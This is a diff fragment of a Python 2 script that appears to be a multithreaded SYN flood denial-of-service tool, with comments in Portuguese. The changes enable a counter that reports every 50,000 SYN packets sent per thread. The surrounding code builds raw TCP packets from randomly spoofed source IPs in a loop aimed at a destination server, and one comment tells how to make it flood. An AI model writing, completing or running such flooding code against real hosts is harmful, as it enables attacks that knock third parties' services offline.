@@ -1,5 +1,9 @@
 import socket
 import time
+import socket, sys, random
+from struct import *
+from threading import Thread
+import time 
 
 def show_begin(ip_dest):
     import time
@@ -69,7 +73,7 @@ def attack(numero_thread, dest_ip):
      
     #Send the packet finally - the port specified has no effect
     #print 'O servidor',dest_ip,'esta sendo atacado'
-    #contador=0
+    contador=0
     #put the above line in a loop like while 1: if you want to flood
     while not flag_encerra_threads:
         #parte de gerar o pacote IP, para cada novo endereco de origem de IP gerado
@@ -89,9 +93,9 @@ def attack(numero_thread, dest_ip):
         source_address = socket.inet_aton( source_ip )
         tcp_length = len(tcp_header)
 
-        # if contador > 49999:
-        #     print 'Foram enviados ',contador,' mensagens de SYN pela thread ',numero_thread 
-        #     contador=0
+        if contador > 49999:
+            print 'Foram enviados ',contador,' mensagens de SYN pela thread ',numero_thread 
+            contador=0
         psh = pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , tcp_length);
         psh = psh + tcp_header;
          
